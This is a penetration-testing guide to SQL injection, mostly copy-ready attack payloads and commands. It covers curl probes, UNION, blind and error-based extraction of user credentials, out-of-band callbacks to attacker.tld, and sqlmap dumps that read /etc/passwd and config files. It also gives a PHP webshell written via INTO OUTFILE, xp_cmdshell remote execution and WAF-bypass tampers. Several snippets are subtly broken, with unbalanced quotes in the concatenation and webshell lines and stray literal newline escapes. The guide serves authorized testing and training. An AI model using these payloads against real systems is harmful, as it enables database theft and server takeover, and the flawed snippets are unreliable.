# SQL Injection (SQLi)

> Detection, manual exploitation, and sqlmap workflow for SQL injection.
> In-band, blind, and out-of-band. DB-specific quirks for MySQL, PostgreSQL,
> MSSQL, Oracle, SQLite.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection (Manual)](#3-detection-manual)
- [4. Manual Exploitation](#4-manual-exploitation)
- [5. sqlmap Workflow](#5-sqlmap-workflow)
- [6. DB-Specific Notes](#6-db-specific-notes)
- [7. WAF Bypass](#7-waf-bypass)
- [8. Common Injection Points](#8-common-injection-points)
- [9. OSCP Notes](#9-oscp-notes)
- [10. Cheatsheet](#10-cheatsheet)
- [11. References](#11-references)

---

## 1. Overview

SQL injection = attacker-controlled input reaches a SQL query without proper
parameterization. Result: read/write DB, sometimes RCE.

**Three families:**

| Family | Signal | Example |
|--------|--------|---------|
| In-band (union, error) | Data or errors in the response | `' UNION SELECT 1,2,3-- -` |
| Blind (boolean) | Response differs by condition | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| Blind (time) | Response delay by condition | `'; IF (1=1) WAITFOR DELAY '0:0:5'-- -` |
| Out-of-band | DNS/HTTP callback | `LOAD_FILE('\\\\attacker.tld\\x')` |

**Where to look:**

- URL params (`?id=1`, `?search=foo`, `?page=2`)
- POST body (forms, JSON, XML)
- Cookies (`session=`, `uid=`, `role=`)
- Headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- API paths (`/api/v1/users/1`)

**Rule of thumb:** if it is a number and comes from the user, try SQLi.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Manual single-quote probe | `[PROD]` |
| UNION extraction (read-only) | `[PROD-RISK]` |
| `sqlmap -r req.txt` (baseline) | `[PROD-RISK]` |
| `sqlmap --dump`, `--os-shell`, `--file-write` | `[PROD-NO]` |
| Time-based blind (heavy delays) | `[PROD-RISK]` |
| UPDATE / DELETE / DROP payloads | `[PROD-NO]` |

### 2.2 What NOT to do (production)

- Do NOT run `sqlmap --dump` without approval (bulk data exfiltration).
- Do NOT use `--os-shell`, `--os-pwn`, `--file-write` (write to target).
- Do NOT test UPDATE/DELETE/DROP (integrity risk).
- Do NOT run time-based blind with long delays against production (SLA).
- Do NOT hammer 1000+ requests without client awareness.

### 2.3 Rate limiting

```bash
# Production default
sqlmap -r req.txt --delay=1 --threads=1 --timeout=10 --retries=1

# If WAF: add --random-agent
sqlmap -r req.txt --delay=1 --random-agent --tamper=space2comment
```

---

## 3. Detection (Manual)

Always start manually. Confirm the injection point before touching sqlmap.

### 3.1 Basic probes

```bash
# Original request
curl -s "http://target/item?id=1"

# Single quote
curl -s "http://target/item?id=1'"

# Double quote
curl -s "http://target/item?id=1%22"

# Arithmetic (should change the item, not the page)
curl -s "http://target/item?id=2-1"
curl -s "http://target/item?id=1' OR '1'='1"
curl -s "http://target/item?id=1' OR '1'='2"
```

**Expected output (error-based):**

```text
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near ''1'' at line 1
```

Errors leak: DB engine, version, table name, sometimes full query.

### 3.2 Boolean-based detection

```bash
curl -s "http://target/item?id=1' AND 1=1-- -"
curl -s "http://target/item?id=1' AND 1=2-- -"
```

Compare response size / content. Different output for `1=1` vs `1=2` = injection.

### 3.3 Time-based detection

Use only when boolean fails (no visible diff).

```bash
# MySQL / MariaDB
curl -s "http://target/item?id=1' AND SLEEP(5)-- -" -w '\ntime_total=%{time_total}\n'

# PostgreSQL
curl -s "http://target/item?id=1'; SELECT pg_sleep(5)-- -" -w '\ntime_total=%{time_total}\n'

# MSSQL
curl -s "http://target/item?id=1'; WAITFOR DELAY '0:0:5'-- -" -w '\ntime_total=%{time_total}\n'

# Oracle
curl -s "http://target/item?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -" -w '\ntime_total=%{time_total}\n'
```

**Expected output:**

```text
time_total=5.0XY
```

5-second delay = injection confirmed.

### 3.4 Comment syntax (need to know per DB)

| DB | Line comment | Block comment |
|----|--------------|---------------|
| MySQL / MariaDB | `-- ` (space required), `#` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| MSSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |
| SQLite | `--` | `/* */` |

`-- -` (dash-dash-space-dash) is the safe trailing comment in every DB.

---

## 4. Manual Exploitation

### 4.1 Determine column count

Two methods. Try both.

**ORDER BY (fast, but errors on mismatch):**

```bash
curl -s "http://target/item?id=1' ORDER BY 1-- -"
curl -s "http://target/item?id=1' ORDER BY 2-- -"
curl -s "http://target/item?id=1' ORDER BY 3-- -"
# stop when the page errors
```

**UNION SELECT NULL (silent, always works):**

```bash
curl -s "http://target/item?id=1' UNION SELECT NULL-- -"
curl -s "http://target/item?id=1' UNION SELECT NULL,NULL-- -"
curl -s "http://target/item?id=1' UNION SELECT NULL,NULL,NULL-- -"
# stop when no error
```

### 4.2 Find visible columns

Replace each NULL with a number and see which appears in the response.

```bash
curl -s "http://target/item?id=1' UNION SELECT 1,2,3-- -"
```

**Expected output (find the "2" in the page):**

```text
<h1>Product #2</h1>
```

Column 2 is reflected. Use it for extraction.

### 4.3 In-band extraction (UNION)

```bash
# Version
curl -s "http://target/item?id=-1' UNION SELECT 1,version(),3-- -"

# Current DB
curl -s "http://target/item?id=-1' UNION SELECT 1,database(),3-- -"

# Current user
curl -s "http://target/item?id=-1' UNION SELECT 1,user(),3-- -"

# Tables (MySQL)
curl -s "http://target/item?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"

# Columns of a table
curl -s "http://target/item?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"

# Dump users
curl -s "http://target/item?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -"
```

Note: use `id=-1` (or `id=0`) so the original row is not shown.

### 4.4 Blind boolean extraction

Character by character, using `SUBSTRING` and a comparison.

```bash
# Is the first char of the DB name 'a'?
curl -s "http://target/item?id=1' AND SUBSTRING(database(),1,1)='a'-- -"

# Is the first char > 'a'? (binary search)
curl -s "http://target/item?id=1' AND ASCII(SUBSTRING(database(),1,1)) > 97-- -"

# Same for a table name
curl -s "http://target/item?id=1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='u'-- -"
```

Automate with sqlmap or a custom script.

### 4.5 Blind time-based extraction

When boolean gives no visible diff, use time.

```bash
# MySQL: is the first char of the DB name 'a'?
curl -s "http://target/item?id=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -" -w 'time_total=%{time_total}\n'

# MSSQL
curl -s "http://target/item?id=1'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:3'-- -" -w 'time_total=%{time_total}\n'

# PostgreSQL
curl -s "http://target/item?id=1'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END-- -" -w 'time_total=%{time_total}\n'
```

Slow. Let sqlmap do it (`--technique=T`).

### 4.6 Error-based extraction

Fast when the app leaks DB errors.

```bash
# MySQL (extractvalue)
curl -s "http://target/item?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"

# MySQL (updatexml)
curl -s "http://target/item?id=1' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -"

# MSSQL
curl -s "http://target/item?id=1' AND 1=CONVERT(int,(SELECT @@version))-- -"

# PostgreSQL
curl -s "http://target/item?id=1' AND 1=CAST((SELECT version()) AS int)-- -"
```

Error message contains the value after `~`.

### 4.7 Out-of-band (OOB)

When no output and no timing, use DNS/HTTP callback.

Requires a listener (Burp Collaborator, interactsh, your own DNS).

```bash
# MySQL (Windows only, UNC path)
curl -s "http://target/item?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.tld\\\\x'))-- -"

# MSSQL
curl -s "http://target/item?id=1'; EXEC master..xp_dirtree '\\\\attacker.tld\\x'-- -"

# Oracle
curl -s "http://target/item?id=1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.tld/'||user) FROM dual-- -"
```

**Setup interactsh:**

```bash
interactsh-client
# copy the generated URL: xyz.oast.fun
# replace attacker.tld above with xyz.oast.fun
```

---

## 5. sqlmap Workflow

### 5.1 Basic usage

```bash
# GET parameter
sqlmap -u "http://target/item?id=1" --batch

# From Burp request file (recommended)
sqlmap -r req.txt --batch
```

### 5.2 POST / cookie / custom header

```bash
# POST with data
sqlmap -u "http://target/login" --data="user=admin&pass=x" --batch

# Cookie
sqlmap -u "http://target/item?id=1" --cookie="session=abc; role=user" --batch

# Custom header (e.g. X-Forwarded-For injection)
sqlmap -u "http://target/" --headers="X-Forwarded-For: 1*" --batch
```

The `*` marks the injection point in `-r` mode too.

### 5.3 Enumeration

```bash
# Enumerate DBs
sqlmap -r req.txt --dbs

# Tables in a DB
sqlmap -r req.txt -D appdb --tables

# Columns of a table
sqlmap -r req.txt -D appdb -T users --columns

# Dump a table
sqlmap -r req.txt -D appdb -T users --dump

# Dump a specific column
sqlmap -r req.txt -D appdb -T users -C username,password --dump
```

### 5.4 High-value targets

```bash
# Current user / DBA check
sqlmap -r req.txt --current-user --is-dba

# Current DB and DB user
sqlmap -r req.txt --current-db --current-user

# OS info (if DBA)
sqlmap -r req.txt --os-info

# Read /etc/passwd (if file-read is supported)
sqlmap -r req.txt --file-read=/etc/passwd

# Read app config
sqlmap -r req.txt --file-read=/var/www/html/config.php
```

### 5.5 Write / RCE (LAB only)

```bash
# Write a webshell (needs FILE privilege + writeable path)
sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/shell.php

# OS shell (MSSQL with xp_cmdshell, or stacked queries elsewhere)
sqlmap -r req.txt --os-shell

# Meterpreter-style takeover (rare)
sqlmap -r req.txt --os-pwn
```

> See also: [../07 Databases/MySQL.md](../07%20Databases/MySQL.md), [../07 Databases/MSSQL.md](../07%20Databases/MSSQL.md)

### 5.6 Techniques and risk level

```bash
sqlmap -r req.txt --technique=BEUSTQ
#   B = Boolean\n#   E = Error\n#   U = Union\n#   S = Stacked\n#   T = Time\n#   Q = Inline query

# Force union only (fastest, safest)
sqlmap -r req.txt --technique=U

# Force blind time (slow, but works when nothing else does)
sqlmap -r req.txt --technique=T
```

### 5.7 Useful flags

| Flag | Purpose |
|------|---------|
| `--batch` | No interactive prompts |
| `--level=5 --risk=3` | Aggressive tests (LAB) |
| `--random-agent` | Random User-Agent |
| `--delay=1` | 1 second between requests (PROD) |
| `--threads=1` | Single thread (PROD) |
| `--dbms=mysql` | Skip DB detection |
| `--tamper=X` | WAF bypass (see §7) |
| `--technique=U` | Force union |
| `--os-shell` | Interactive OS shell (LAB) |
| `--file-read=...` | Read a file from the target |
| `--file-write=...` | Write a file to the target (LAB) |
| `--dump-all` | Dump every DB (LAB, huge) |

---

## 6. DB-Specific Notes

Short SQLi-focused cheats per DB. Full details in
[../07 Databases/](../07%20Databases/).

### 6.1 MySQL / MariaDB

```sql
-- Version
SELECT @@version;

-- Current DB / user
SELECT database();
SELECT user();

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- File read (needs FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- File write / webshell
SELECT '<?php system($_GET['c']); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Concatenation
SELECT CONCAT(username, ':'', password) FROM users;
```

Comments: `-- ` (space), `#`, `/* */`.

### 6.2 PostgreSQL

```sql
-- Version
SELECT version();

-- Current DB / user
SELECT current_database();
SELECT current_user;

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- File read (superuser)
SELECT pg_read_file('/etc/passwd');

-- RCE (superuser, PG 8.1-11)
COPY (SELECT '') TO PROGRAM 'id';

-- Concatenation
SELECT username || ':'' || password FROM users;
```

Comments: `--`, `/* */`.

### 6.3 MSSQL

```sql
-- Version
SELECT @@version;

-- Current DB / user
SELECT db_name();
SELECT SUSER_SNAME();

-- Tables
SELECT name FROM sysobjects WHERE xtype='U';
SELECT table_name FROM information_schema.tables;

-- File read (requires BULK INSERT permission)
-- (see Databases/MSSQL.md for full setup)

-- RCE via xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Concatenation
SELECT username + ':'' + password FROM users;
```

Comments: `--`, `/* */`.

### 6.4 Oracle

```sql
-- Version
SELECT banner FROM v$version;

-- Current user / DB
SELECT user FROM dual;
SELECT ora_database_name FROM dual;

-- Tables
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

-- Concatenation
SELECT username || ':'' || password FROM users;

-- Limited out-of-band (no native file-read without PL/SQL)
```

Comments: `--`, `/* */`. Note: `FROM dual` required in bare SELECTs.

### 6.5 SQLite

```sql
-- Version
SELECT sqlite_version();

-- Tables
SELECT name FROM sqlite_master WHERE type='table';

-- Columns
SELECT sql FROM sqlite_master WHERE name='users';

-- No file read/write, no RCE (client-side DB)
```

Comments: `--`, `/* */`.

> See also: [../07 Databases.md](../07%20Databases/README.md)

---

## 7. WAF Bypass

See [WAF-Detection.md](../01%20Recon/WAF-Detection.md) §6 for the full strategy.

**Top-5 sqlmap tampers:**

```bash
sqlmap -r req.txt --tamper=space2comment,randomcase,charencode
sqlmap -r req.txt --tamper=between,charunicodeencode --random-agent --delay=1
```

| Tamper | Effect |
|--------|--------|
| `space2comment` | `SELECT x` -> `SELECT/**/x` |
| `randomcase` | Random keyword case (`SeLeCt`) |
| `charencode` | URL-encode each char |
| `charunicodeencode` | Unicode-encode each char |
| `between` | `=` -> `BETWEEN ... AND ...` |

Full list: `sqlmap --list-tampers`.

Manual bypass examples:

```sql
-- Original (blocked)
' UNION SELECT 1,2,3-- -

-- Case variation
' UnIoN sElEcT 1,2,3-- -

-- Comment insertion
' UNION/**/SELECT/**/1,2,3-- -

-- MySQL version comment
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -

-- URL encoding
%27%20UNION%20SELECT%201,2,3--%20-
```

---

## 8. Common Injection Points

Places where SQLi shows up most often:

- URL query string: `?id=1`, `?user=admin`, `?page=2`
- RESTful paths: `/api/v1/users/1`, `/item/abc`
- Login forms: `username`, `password`, `email`
- Search fields: `?q=`, `?search=`
- Sort / filter params: `?sort=name`, `?order=ASC`
- Cookies: `session=`, `uid=`, `role=`
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`
- JSON body: `{"id":"1"}` -> sqlmap `-r req.txt` handles it
- XML body: -> see [../06 Technologies/XXE.md](../08%20Vulnerabilities/XXE.md)

For REST/JSON specifics, see [../../03 API/02 REST.md](../../03%20API/02%20REST.md)
(once published).

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the raw SQLi probe and the resulting error or data leak.
> - Screenshot the `sqlmap` enumeration of tables and columns.
> - Screenshot the final credential / flag extracted.
> - Screenshot any RCE (`--os-shell`, `--file-write`) proving the foothold.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 10. Cheatsheet

### Manual probes

```bash
curl -s "http://target/item?id=1'"
curl -s "http://target/item?id=1' OR '1'='1"
curl -s "http://target/item?id=1' AND SLEEP(5)-- -" -w 'time=%{time_total}\n'
```

### Union extraction

```sql
' ORDER BY 3-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -
```

### sqlmap

```bash
sqlmap -r req.txt --batch
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D appdb -T users --dump
sqlmap -r req.txt --file-read=/etc/passwd
sqlmap -r req.txt --os-shell                # LAB only
sqlmap -r req.txt --tamper=space2comment,randomcase --random-agent
```

---

## 11. References

- PayloadsAllTheThings - SQLi - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- PortSwigger SQLi - https://portswigger.net/web-security/sql-injection
- sqlmap wiki - https://github.com/sqlmapproject/sqlmap/wiki
- sqlmap tamper scripts - https://github.com/sqlmapproject/sqlmap/wiki/Tamper-scripts
- OWASP WSTG - SQLi - https://owasp.org/www-project-web-security-testing-guide/

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../07 Databases.md](../07%20Databases/README.md), [../../03 API/02 REST.md](../../03%20API/02%20REST.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
